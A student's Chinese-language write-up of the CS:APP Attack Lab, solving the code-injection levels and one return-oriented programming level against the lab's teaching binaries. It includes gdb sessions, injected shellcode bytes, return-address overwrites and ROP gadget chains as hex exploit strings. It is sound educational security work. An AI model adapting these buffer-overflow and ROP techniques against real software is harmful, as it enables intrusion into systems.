#Code Injection Attack

## Level 1

先设置断点：

​	break getbuf           //调用Gets之前

​	break save_term         //返回getbuf之前

在断点分别print $rsp，可得到(void *) 0x5561dca0和(void *) 0x5561dc50，由此可知输入字符串在栈上的大概位置是0x5561dc50~0x5561dca0之间。



为便于检查，输入一个规则字符串，如Type string:mmmmmmmmmmmmmmmmmmm

然后，检查字节，得到如下结果：

(gdb) x/g 0x5561dc50
0x5561dc50:	0x0000000000401a8a
(gdb) x/g 0x5561dc58
0x5561dc58:	0x0000000055586000
(gdb) x/g 0x5561dc60
0x5561dc60:	0x0000000055685fe8
(gdb) x/g 0x5561dc68
0x5561dc68:	0x0000000000000002
(gdb) x/g 0x5561dc70
0x5561dc70:	0x00000000004017b4
(gdb) x/g 0x5561dc78
0x5561dc78:	0x6d6d6d6d6d6d6d6d
(gdb) x/g 0x5561dc80
0x5561dc80:	0x6d6d6d6d6d6d6d6d
(gdb) x/g 0x5561dc88
0x5561dc88:	0x00000000006d6d6d

(gdb) x/g 0x5561dc90

0x5561dc90:	0x0000000000000000
(gdb) x/g 0x5561dc98
0x5561dc98:	0x0000000055586000
(gdb) x/g 0x5561dca0
0x5561dca0:	0x0000000000401976

则，字符串的起始地址为0x5561dc78，需要被改变的返回地址在0x5561dca0处。

disas touch1可得touch1的起始地址为0x00000000004017c0，故只需将从0x5561dca0开始的3个字节更改为c0 17 40。

输入任意40个字符后接c0 17 40对应的字符即可。

Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 C0 17 40



## Level 2

​	调用touch2函数之前，需要将寄存器&rdi的值设置为cookie值，在Level1的基础上修改exploit string。首先，将末端的返回地址改为78 dc 61 55 00 00 00 00，这是exploit string的起始地址0x5561dc78，从此地址开始设置injected code。

​	第一条指令需要设置&rdi的值，在其他函数里随便找一条传立即数的mov指令，照搬过来，将其中的立即数值设置为cookie值0x59b997fa，即可。

​	接着，第二条指令，为retq指令，占一个字节，代码为c3。

​	然后，要调用touch2函数，在第一个返回地址后面再加上touch2的地址0x00000000004017ec，小端存储表示为ec 17 40 00 00 00 00 00。

miigao@miigao-PC:~/csapp3e-lab2-attacklab/attacklab-handout$ ./ctarget -q < exploit-raw2.txt 
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 C3 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00 



## Level 3

​	要传递的参数是一个字符串地址，字符串内容为cookie值“59b997fa”，通过查ASCII码表将其转换为“35 39 62 39 39 37 66 61 00”（最后面要添上一个字节00），第一次，我将字符串放置在起始地址

0x5561dc98（为exploit string分配的空间的靠后的区域），结果是misfire。

​	在strncmp函数前设置断点，检查发现injected code被更改了一部分，而低地址的8个字节未被更改，故可知应将cookie值“59b997fa”放置在低地址位置，将指令放到后面，指令执行后被更改没有影响。

(gdb) x/gx 0x5561dc78
0x5561dc78:	0x4444c35561dc97bf
(gdb) x/gx 0x5561dc80
0x5561dc80:	0x182b4db0d1d58200
(gdb) x/gx 0x5561dc88
0x5561dc88:	0x000000005561dc97
(gdb) x/gx 0x5561dc90
0x5561dc90:	0x0000000055685fe8
(gdb) x/gx 0x5561dc98
0x5561dc98:	0x0000000000000002
(gdb) x/gx 0x5561dca0
0x5561dca0:	0x0000000000401916
(gdb) x/gx 0x5561dca8

调整之后，顺利通过。

miigao@miigao-PC:~/csapp3e-lab2-attacklab/attacklab-handout$ ./ctarget -q < exploit-raw3.txt 
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:35 39 62 39 39 37 66 61 00 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 BF 78 DC 61 55 C3 97 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 



# Return-oriented Programming

## Level 2

​	因为在栈上申请的空间nonexecutable，所以exploit string的前40个字节没法利用了，地址跳转和数据传送都是利用栈顶指向的内容。

​	首先需要设置寄存器%rdi的值为cookie值，查Figure3.B可知，指令编码5f可以直接将栈顶内容弹出并传送至寄存器%rdi。然而，在gadgets farm中并没有任何字节为5f，故需要利用其他寄存器做中转，可先将cookie值传送至寄存器%rax，再利用指令movq %rax, %rdi将cookie值传到%rdi。

​	在gadgets farm中先找到popq %rax 的一个编码0x58的地址0x4019cc，第一个跳转地址编码为“cc 19 40 00 00 00 00 00”,后面接上cookie值的编码“fa 97 b9 59 00 00 00 00”,然后再找到一个movq %rax, %rdi的编码0x48 89 c7的地址0x4019a2，第二个跳转地址为“a2 19 40 00 00 00 00 00”,最后第三个跳转地址为touch2函数的地址“ec 17 40 00 00 00 00 00”。

miigao@miigao-PC:~/csapp3e-lab2-attacklab/attacklab-handout$ ./rtarget -q <exploit-raw4.txt 
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:BF FA 97 B9 59 C3 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 



## Level 3

To be continued.